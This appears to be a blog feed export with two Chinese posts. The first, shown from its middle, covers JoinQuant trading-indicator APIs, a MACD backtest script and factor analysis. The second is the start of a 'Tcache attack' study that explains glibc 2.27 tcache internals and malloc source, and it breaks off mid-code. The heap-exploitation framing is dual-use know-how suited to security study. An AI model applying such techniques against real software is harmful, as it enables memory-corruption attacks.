<p>由于上面的公式对RSI的定义较为明确，即<strong>上涨的力量与下跌的力量进行比较</strong>，显然，上涨的力量越大，对应计算出的指数越上升；而下跌的力量越大，则对应指数出市场的弱势。</p>
<p><strong>策略L:</strong></p>
<ul>
<li>RSI &gt; 80 为超买，RSI &lt; 20 为超卖</li>
<li>RSI 以50为中界线，大于50为多头行情，小于50为空头行情</li>
<li>RSI 在80以上形成M头或顶部形态时，为向下反转信号</li>
<li>RSI 在20以下形成W底或底部形态时，为向上反转信号</li>
</ul>
<p><code>RSI(security_list, check_date, N1=6, unit = &#39;1d&#39;, include_now = True, fq_ref_date = None)</code></p>
<p><strong>参数：</strong></p>
<ul>
<li>security_list：标的列表</li>
<li>check_date：要查询数据的日期</li>
<li>N1：统计的天数N1</li>
<li>unit：统计周期，默认为 ‘1d’, 支持如下周期: ‘1m’, ‘5m’, ‘15m’, ‘30m’, ‘60m’, ‘120m’, ‘1d’, ‘1w’, ‘1M’. ‘1w’ 表示一周, ‘1M’ 表示一月</li>
<li>include_now：是否包含当前周期，默认为 True</li>
<li>fq_ref_date：复权基准日，默认为 None</li>
</ul>
<p><strong>返回：</strong></p>
<ul>
<li>RSI 的值。</li>
</ul>
<p><strong>返回结果类型：</strong></p>
<ul>
<li>字典(dict)：键(key)为标的代码，值(value)为数据。</li>
<li>如： {‘000001.XSHE’: 86.697784941552129, ‘603177.XSHG’: nan, ‘000002.XSHE’: 45.669839353084029, ‘601211.XSHG’: 65.952531344607962}</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> jqlib.technical_analysis <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">security_list = [<span class="string">&#x27;000001.XSHE&#x27;</span>,<span class="string">&#x27;000002.XSHE&#x27;</span>,<span class="string">&#x27;601211.XSHG&#x27;</span>]</span><br><span class="line">_RSI = RSI(security_list,check_date=<span class="string">&#x27;2022-09-01&#x27;</span>,N1=<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> stock <span class="keyword">in</span> security_list:</span><br><span class="line">    <span class="built_in">print</span>(stock,<span class="string">&#x27;2022-09-01RSI=&#x27;</span>,_RSI[stock])</span><br></pre></td></tr></table></figure>

<h3 id="KDJ-1"><a href="#KDJ-1" class="headerlink" title="KDJ"></a>KDJ</h3><p>定义前面有，用的非常多</p>
<p><code>KDJ(security_list, check_date, N =9, M1=3, M2=3, unit = &#39;1d&#39;, include_now = True, fq_ref_date = None)</code></p>
<p><strong>参数：</strong></p>
<ul>
<li>security_list：标的列表</li>
<li>check_date：要查询数据的日期</li>
<li>N：统计的天数 N</li>
<li>M1：统计的天数 M1</li>
<li>M2：统计的天数 M2</li>
<li>unit：统计周期，默认为 ‘1d’, 支持如下周期: ‘1m’, ‘5m’, ‘15m’, ‘30m’, ‘60m’, ‘120m’, ‘1d’, ‘1w’, ‘1M’. ‘1w’ 表示一周, ‘1M’ 表示一月</li>
<li>include_now：是否包含当前周期，默认为 True</li>
<li>fq_ref_date：复权基准日，默认为 None</li>
</ul>
<p><strong>返回：</strong></p>
<ul>
<li>K，D和J 的值。</li>
</ul>
<p><strong>返回结果类型：</strong></p>
<ul>
<li>字典(dict)：键(key)为标的代码，值(value)为数据。</li>
<li>如：({‘000001.XSHE’: 89.145187806127595, ‘603177.XSHG’: nan, ‘000002.XSHE’: 20.523907534762358, ‘601211.XSHG’: 82.545216532766361}, {‘000001.XSHE’: 82.915346288340473, ‘603177.XSHG’: nan, ‘000002.XSHE’: 21.246652224886216, ‘601211.XSHG’: 80.903864946907802}, {‘000001.XSHE’: 101.60487084170185, ‘603177.XSHG’: nan, ‘000002.XSHE’: 19.078418154514644, ‘601211.XSHG’: 85.827919704483492})</li>
</ul>
<p><strong>用法注释：</strong></p>
<ol>
<li><p>指标&gt;80 时，回档机率大；指标&lt;20时，反弹机率大；</p>
</li>
<li><p>K在20左右向上交叉D时，视为买进信号； </p>
</li>
<li><p>K在80左右向下交叉D时，视为卖出信号； </p>
</li>
<li><p>J&gt;100 时，股价易反转下跌；J&lt;0 时，股价易反转上涨； </p>
</li>
<li><p>KDJ 波动于50左右的任何信号，其作用不大。</p>
</li>
</ol>
<h2 id="压力支撑指标"><a href="#压力支撑指标" class="headerlink" title="压力支撑指标"></a>压力支撑指标</h2><h3 id="BOLL"><a href="#BOLL" class="headerlink" title="BOLL"></a>BOLL</h3><p><code>Bollinger_Bands(security_list, check_date, timeperiod=20, nbdevup=2, nbdevdn=2, unit = &#39;1d&#39;, include_now = True, fq_ref_date = None)</code></p>
<p><strong>参数：</strong></p>
<ul>
<li>security_list：标的列表</li>
<li>check_date：要查询数据的日期</li>
<li>timeperiod：统计的天数timeperiod</li>
<li>nbdevup：统计的天数 nbdevup</li>
<li>nbdevdn：统计的天数 nbdevdn</li>
<li>unit：统计周期，默认为 ‘1d’, 支持如下周期: ‘1m’, ‘5m’, ‘15m’, ‘30m’, ‘60m’, ‘120m’, ‘1d’, ‘1w’, ‘1M’. ‘1w’ 表示一周, ‘1M’ 表示一月</li>
<li>include_now：是否包含当前周期，默认为 True</li>
<li>fq_ref_date：复权基准日，默认为 None</li>
</ul>
<p><strong>返回：</strong></p>
<ul>
<li>上轨线UB 、中轨线MB、下轨线LB 的值。</li>
</ul>
<p><strong>返回结果类型：</strong></p>
<ul>
<li>字典(dict)：键(key)为标的代码，值(value)为数据。</li>
<li>如： ({‘000001.XSHE’: 9.2899945886169739, ‘603177.XSHG’: nan, ‘000002.XSHE’: 21.378028110909778, ‘601211.XSHG’: 18.846866409164456}, {‘000001.XSHE’: 9.1745000000000037, ‘603177.XSHG’: nan, ‘000002.XSHE’: 20.795500000000004, ‘601211.XSHG’: 18.423999999999999}, {‘000001.XSHE’: 9.0590054113830334, ‘603177.XSHG’: nan, ‘000002.XSHE’: 20.21297188909023, ‘601211.XSHG’: 18.001133590835543})</li>
</ul>
<p><strong>备注：</strong></p>
<ul>
<li>计算方式与通达信、东方财富和同花顺相同</li>
</ul>
<p><strong>用法注释：</strong></p>
<ol>
<li><p>股价上升穿越布林线上限时，回档机率大； </p>
</li>
<li><p>股价下跌穿越布林线下限时，反弹机率大； </p>
</li>
<li><p>布林线震动波带变窄时，表示变盘在即； </p>
</li>
<li><p>BOLL须配合BB 、WIDTH 使用；</p>
</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义股票池列表</span></span><br><span class="line">security_list1 = <span class="string">&#x27;000001.XSHE&#x27;</span></span><br><span class="line">security_list2 = [<span class="string">&#x27;000001.XSHE&#x27;</span>,<span class="string">&#x27;000002.XSHE&#x27;</span>,<span class="string">&#x27;601211.XSHG&#x27;</span>,<span class="string">&#x27;603177.XSHG&#x27;</span>]</span><br><span class="line"><span class="comment"># 计算并输出 security_list1 的 BOLL 值</span></span><br><span class="line">upperband, middleband, lowerband = Bollinger_Bands(security_list1, check_date=<span class="string">&#x27;2017-01-04&#x27;</span>, timeperiod=<span class="number">20</span>, nbdevup=<span class="number">2</span>, nbdevdn=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span> upperband[security_list1]</span><br><span class="line"><span class="built_in">print</span> middleband[security_list1]</span><br><span class="line"><span class="built_in">print</span> lowerband[security_list1]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 security_list2 的 BOLL 值</span></span><br><span class="line">upperband, middleband, lowerband = Bollinger_Bands(security_list2, check_date=<span class="string">&#x27;2017-01-04&#x27;</span>, timeperiod=<span class="number">20</span>, nbdevup=<span class="number">2</span>, nbdevdn=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> stock <span class="keyword">in</span> security_list2:</span><br><span class="line">    <span class="built_in">print</span> upperband[stock]</span><br><span class="line">    <span class="built_in">print</span> middleband[stock]</span><br><span class="line">    <span class="built_in">print</span> lowerband[stock]</span><br></pre></td></tr></table></figure>

<h2 id="量价指标"><a href="#量价指标" class="headerlink" title="量价指标"></a>量价指标</h2><h3 id="OBV"><a href="#OBV" class="headerlink" title="OBV"></a>OBV</h3><p><a href="https://www.joinquant.com/help/api/help#OBV-%E7%B4%AF%E7%A7%AF%E8%83%BD%E9%87%8F%E7%BA%BF">参考连接</a></p>
<h3 id="VOL"><a href="#VOL" class="headerlink" title="VOL"></a>VOL</h3><p>成交量指标：</p>
<p><strong>用法注释：</strong></p>
<ol>
<li>成交量大，代表交投热络，可界定为热门股；</li>
<li>底部起涨点出现大成交量(成交手数)，代表攻击量；</li>
<li>头部地区出现大成交量(成交手数)，代表出货量；</li>
<li>观察成交金额的变化，比观察成交手数更具意义，因为成交手数并未反应股价的涨跌的后所应支出的实际金额。</li>
</ol>
<p><a href="https://www.joinquant.com/help/api/help#VOL-%E6%88%90%E4%BA%A4%E9%87%8F">参考链接</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqdata <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> jqlib.technical_analysis <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义股票池列表</span></span><br><span class="line">security_list = [<span class="string">&#x27;000001.XSHE&#x27;</span>,<span class="string">&#x27;000002.XSHE&#x27;</span>]</span><br><span class="line">check_dates = [<span class="string">&#x27;2022-10-31&#x27;</span>,<span class="string">&#x27;2022-11-01&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> check_date <span class="keyword">in</span> check_dates:</span><br><span class="line">    <span class="keyword">for</span> security <span class="keyword">in</span> security_list:</span><br><span class="line">        _VOL,MAVOL1,MAVOL2 = VOL(security,check_date=check_date,M1=<span class="number">5</span>,M2=<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(check_date,<span class="string">f&#x27;<span class="subst">&#123;security&#125;</span>的VOL:&#x27;</span>,_VOL[security])</span><br><span class="line">        <span class="built_in">print</span>(check_date,<span class="string">f&#x27;<span class="subst">&#123;security&#125;</span>的MOVAL1:&#x27;</span>,MAVOL1[security])</span><br><span class="line">        <span class="built_in">print</span>(check_date,<span class="string">f&#x27;<span class="subst">&#123;security&#125;</span>的MOVAL2:&#x27;</span>,MAVOL2[security])</span><br></pre></td></tr></table></figure>

<h1 id="量化策略回测"><a href="#量化策略回测" class="headerlink" title="量化策略回测"></a>量化策略回测</h1><h2 id="回测流程"><a href="#回测流程" class="headerlink" title="回测流程"></a>回测流程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    A[选择股票池和实现回测函数] --&gt; B[设定回测时间段,初始金额及调仓频率]</span><br><span class="line">    B --&gt; C[历史数据载入]</span><br><span class="line">    C --&gt; D[处理订单]</span><br><span class="line">    D --&gt; E[取消未完成订单]</span><br><span class="line">    E --&gt; F[输出日志]</span><br><span class="line">    F --&gt; G[生成回测报告]</span><br></pre></td></tr></table></figure>

<ul>
<li><p>选择股票池和实现回测函数 实现handle_data函数 编写量化交易策略</p>
</li>
<li><p>选定一个回测开始时间和结束日期 选择初始金额和调仓频率</p>
</li>
<li><p>取得股票数据 调用handle_data()函数</p>
</li>
<li><p>下单后，根据接下来时间的实际交易情况，处理订单</p>
</li>
<li><p>下单后，可以调用get_open_orders()取得所有未完成订单，调用cancel_order取消订单</p>
</li>
<li><p>可在任何时间打印日志</p>
</li>
<li><p>回测结束，生成回测报告，画出收益曲线和基准收益曲线，列出每日持仓和交易情况</p>
</li>
</ul>
<h2 id="MACD-2"><a href="#MACD-2" class="headerlink" title="MACD"></a>MACD</h2><p>金叉买入，死叉卖出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jqdata</span><br><span class="line"><span class="keyword">from</span> jqlib.technical_analysis <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定基准沪深300</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    <span class="comment">#开启动态复权</span></span><br><span class="line">    set_option(<span class="string">&#x27;use_real_price&#x27;</span>, <span class="literal">True</span>)</span><br><span class="line">    <span class="comment">#设定标的</span></span><br><span class="line">    g.security = <span class="string">&#x27;000001.XSHE&#x27;</span></span><br><span class="line">    <span class="comment">#设置MACD的初始化值</span></span><br><span class="line">    g.macd_yesterday = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context, data</span>):</span><br><span class="line">    security = g.security</span><br><span class="line">    <span class="comment"># 计算当天的MACD</span></span><br><span class="line">    DIF,DEA,_MACD = MACD(security_list = security,check_date=context.current_dt,</span><br><span class="line">                        SHORT=<span class="number">6</span>,LONG=<span class="number">12</span>,MID=<span class="number">9</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取当日现金</span></span><br><span class="line">    cash = context.portfolio.cash</span><br><span class="line">    <span class="comment">#计算金叉</span></span><br><span class="line">    <span class="keyword">if</span> g.macd_yesterday &lt; <span class="number">0</span> <span class="keyword">and</span> _MACD[security] &gt; <span class="number">0</span> <span class="keyword">and</span> cash &gt; <span class="number">0</span>:</span><br><span class="line">        order_value(security,cash)</span><br><span class="line">    <span class="comment">#计算死叉</span></span><br><span class="line">    <span class="keyword">elif</span> g.macd_yesterday &gt; <span class="number">0</span> <span class="keyword">and</span> _MACD[security] &lt; <span class="number">0</span> <span class="keyword">and</span> context.portfolio.positions[security].closeable_amount &gt; <span class="number">0</span>:</span><br><span class="line">        order_target(security,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#更新当天MACD值</span></span><br><span class="line">    g.macd_yesterday = _MACD[security]</span><br></pre></td></tr></table></figure>

<h2 id="量化回测的风险指标"><a href="#量化回测的风险指标" class="headerlink" title="量化回测的风险指标"></a>量化回测的风险指标</h2><p>定义：即股票投资收益率的<strong>不确定性</strong>通常称之为<strong>风险</strong>，具体是指股票市场的一些未知的、不可预测的因素对股票价格造成的不确定的影响，可能是正面影响收益率，也可能是负面的背离。风险指标是对<strong>风险的量化评估</strong>。</p>
<p>特点：风险指标有利于投资者对投资策略进行一个客观的评价。无论是回测还是模拟，所有风险指标都会根据<strong>每天收益后的收益计算</strong>更新一次，并<strong>不考虑每盘中的收益情况</strong>。</p>
<p>定义：Alpha是投资者获得与市场波动无关的回报。阿尔法系数，是基金&#x2F;投资的绝对回报和按照beta系数计算的预期回报之间的差额。阿尔法收益与风险相关性很低。</p>
<p>算法：绝对收益或超额收益是基金&#x2F;投资的<strong>实际收益减去无风险投资收益</strong>。例如投资者获得了15%的回报，其基准获得了10%的回报，那么Alpha部分就是5%。</p>
<p>公式：Alpha &#x3D; 投资年化收益率 - [无风险回报率+Beta*(基准年化收益率 - 无风险回报率)]</p>
<p>beta：表示投资的系统性风险，反映了策略对大盘变化的敏感性。例如一个策略的Beta为1.5，则大盘涨1%的时候，策略可能涨1.5%，反之亦然；如果一个策略的Beta为-1.5，说明大盘涨1%的时候，策略可能跌1.5%，反之亦然。</p>
<p>夏普比率：表示每承受一单位总风险，会产生多少的超额报酬，可以<strong>同时对策略的收益与风险进行综合考虑</strong>。（越高越好）</p>
<p><a href="https://www.joinquant.com/help/api/help#%E9%A3%8E%E9%99%A9%E6%8C%87%E6%A0%87">各种风险指标详细参考</a></p>
<h1 id="因子分析"><a href="#因子分析" class="headerlink" title="因子分析"></a>因子分析</h1><h2 id="因子分析概述"><a href="#因子分析概述" class="headerlink" title="因子分析概述"></a>因子分析概述</h2><p>就是根据因子或特定的特征使我们能赚钱的方法。包括波动性、动量、股票规模等。</p>
<p>综述一下，就是根据<strong>财务指标和技术指标</strong>作为因子（因子构造），通过选定的因子来选股（因子选股），构建股票池，策略回测（再优化）</p>
<h2 id="自定义因子"><a href="#自定义因子" class="headerlink" title="自定义因子"></a>自定义因子</h2><p>自定义因子类继承了factor类，三个基本属性，分别为<strong>name、max_window和dependencies</strong>；一个核心函数——calc()</p>
<p>构建自定义因子流程：构造因子属性—-&gt;实现因子计算—–&gt;因子分析</p>
<ul>
<li>name，因子名称。因子名称只能由字母、数字和下划线组成，并且第一个字符不能是数字，另外不能与Python中的关键字相同，也不能与基础因子冲突。</li>
<li>max_window，获取数据的最长时间窗口，返回日线数据。</li>
<li>dependencies，自定义因子依赖的基础因子名称，如high, low, close。</li>
</ul>
<p>**因子计算：**实现Factor类内置calc()函数  calc(self,data)</p>
<ul>
<li>data：字典对象</li>
<li>key属性是dependencies中的因子名称</li>
<li>value属性是因子对应的数据表(pandas.DataFrame格式)</li>
</ul>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">self,data</span>):</span><br><span class="line">    <span class="keyword">return</span> data[<span class="string">&#x27;close&#x27;</span>][-<span class="number">10</span>].mean()</span><br></pre></td></tr></table></figure>

<p>返回：Pandas.Series：index属性是股票代码，value属性是因子值</p>
<p>**单因子分析：**调用analyze_factor</p>
<p><code>analyze_factor(factor,start_date,end_date,industry,universe,quantiles,periods,weight_method,use_real_price,skip_paused,max_loss,factor_dep_definitions)</code></p>
<ul>
<li><p>factor: 获取因子值，可输入三种类型的值</p>
<ol>
<li>pandas.DataFrame: 因子值，columns为股票代码（如’000001.XSHE’），index为日期的DatetimeIndex或str</li>
<li>pandas.Series: 因子值，index为日期索引和股票代码的MultiIndex</li>
<li>Factor的子类，自定义因子</li>
</ol>
</li>
<li><p>start_date: 开始日期；end_date: 结束日期</p>
</li>
<li><p>industry: 获取行业分类，默认值为’jq_l1’    ‘sw_l1’:申万一级行业；’sw_l2’:申万二级行业；’sw_l3’:申万三级行业；’jq_l1’:聚宽一级行业；’jq_l2’:聚宽二级行业；’zjw’: 证监会行业</p>
</li>
<li><p>universe: 对<strong>股票池</strong>的定义，可输入两种类型的值。为str时认为输入的是一个股票池；当factor输入为因子值时(DataFrame、Series)，该参数无效</p>
</li>
<li><p>quantiles: 分位数数量，默认5</p>
</li>
<li><p>periods: 调仓周期，int或int的列表，默认[1, 5, 10]</p>
</li>
<li><p>weight_method: 计算分位数收益时的加权方法；avg: 按平均加权；mktcap: 按市场加权</p>
</li>
<li><p>use_real_price: 是否使用复权，默认False（当factor为因子值时这个参数失效）</p>
</li>
<li><p>skip_paused: 是否跳过停牌，默认False（当factor为因子值时这个参数失效）</p>
</li>
<li><p>max_loss: 因重置值或nan值太多而无效的因子值的最大占比，默认0.25 </p>
</li>
<li><p>factor_dep_definitions: 主因子的依赖因子的列表，默认为空列表（注：当factor为因子值时这个参数失效）</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqfactor <span class="keyword">import</span> Factor,analyze_factor</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MA10</span>(<span class="title class_ inherited__">Factor</span>):</span><br><span class="line">    <span class="comment">#因子名称为&#x27;ma10&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;ma10&#x27;</span></span><br><span class="line">    <span class="comment">#设定最长时间窗口</span></span><br><span class="line">    max_window = <span class="number">10</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设置依赖的基础因子</span></span><br><span class="line">    dependencies = [<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#实现因子计算</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">self,data</span>):</span><br><span class="line">        <span class="keyword">return</span> data[<span class="string">&#x27;close&#x27;</span>][-<span class="number">10</span>:].mean()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#单因子分析</span></span><br><span class="line">far = analyze_factor(factor=MA10,start_date=<span class="string">&#x27;2022-01-01&#x27;</span>,end_date=<span class="string">&#x27;2022-06-30&#x27;</span>,weight_method=<span class="string">&#x27;mktcap&#x27;</span>,</span><br><span class="line">                    universe=<span class="string">&#x27;000300.XSHG&#x27;</span>,industry=<span class="string">&#x27;jq_l1&#x27;</span>,quantiles=<span class="number">8</span>,periods=(<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>))</span><br><span class="line"><span class="comment">#分析结束后通过不同属性获取数据</span></span><br><span class="line"><span class="comment">#月度信息系数</span></span><br><span class="line">far.ic_monthly</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p><strong>害，突然觉得量化基于这些指标的操作我并不喜欢，或者说我觉得量化的这些策略并没太大好处，就到这了</strong></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache attack</title>
    <url>/2025/03/26/tcache_attack/</url>
    <content><![CDATA[<p>文章是在初次学习tcache_attack时写的，有不准确的地方还望指正，文章中所用的环境基本都是ubuntu18.04</p>
<h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><p>cache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。</p>
<blockquote>
<p>主要参考了 glibc 2.27源码，</p>
</blockquote>
<h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><p>tcache 引入了两个新的结构体，<code>tcache_entry</code> 和 <code>tcache_perthread_struct</code>。</p>
<p>这其实和 fastbin 很像，但又不一样。</p>
<h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p><code>tcache_entry</code> 用于链接空闲的 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk。</p>
<p>需要注意的是这里的 next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。</p>
<p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p>
<h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 tcache_entry，其中</p>
<ul>
<li><code>tcache_entry</code> 用<strong>单向链表</strong>的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li>
<li><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，<strong>每条链上最多可以有 7 个 chunk</strong>。</li>
</ul>
<p>用图表示大概是：</p>
<p><img data-src="/../images/006AWYXBly1fw87zlnrhtj30nh0ciglz.jpg" alt="img"></p>
<h3 id="基本工作方式"><a href="#基本工作方式" class="headerlink" title="基本工作方式"></a>基本工作方式</h3><ul>
<li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li>
<li>free 内存，且 size 小于 small bin size 时</li>
<li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 后：<ul>
<li>先放到对应的 tcache 中，直到 tcache 被填满（<strong>默认是 7 个</strong>）</li>
<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 中的 chunk 不会合并（<strong>不取消 inuse bit</strong>）</li>
</ul>
</li>
<li>malloc 内存，且 size 在 tcache 范围内</li>
<li>先从 tcache 取 chunk，直到 tcache 为空</li>
<li>tcache 为空后，从 bin 中找</li>
<li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk**，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中**，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol>
<li>tcache最多由64个bins链接而成，而每一个bins中最多放7个chunk</li>
<li>64位机中最小size是24字节,每16字节递增一次,而32位机上为12字节,每8字节递增一次</li>
<li>这也就意味着我们最大的chunk必须小于0x410,也就是我们申请的size要小于0x408(64位机上)</li>
</ol>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>接下来从2.27源码的角度分析一下 tcache。</p>
<h4 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h4><p>第一次 malloc 时，会进入到 <code>MAYBE_INIT_TCACHE ()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  <span class="comment">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span></span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化 tcache</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="comment">// 根据 size 得到的 idx 在合法的范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// tcache-&gt;entries[tc_idx] 有 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="tcache-init"><a href="#tcache-init" class="headerlink" title="__tcache_init()"></a>__tcache_init()</h4><p>其中 <code>MAYBE_INIT_TCACHE ()</code> 在 tcache 为空（即第一次 malloc）时调用了 <code>tcache_init()</code>，直接查看 <code>tcache_init()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tcache_init(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  arena_get (ar_ptr, bytes); <span class="comment">// 找到可用的 arena</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span 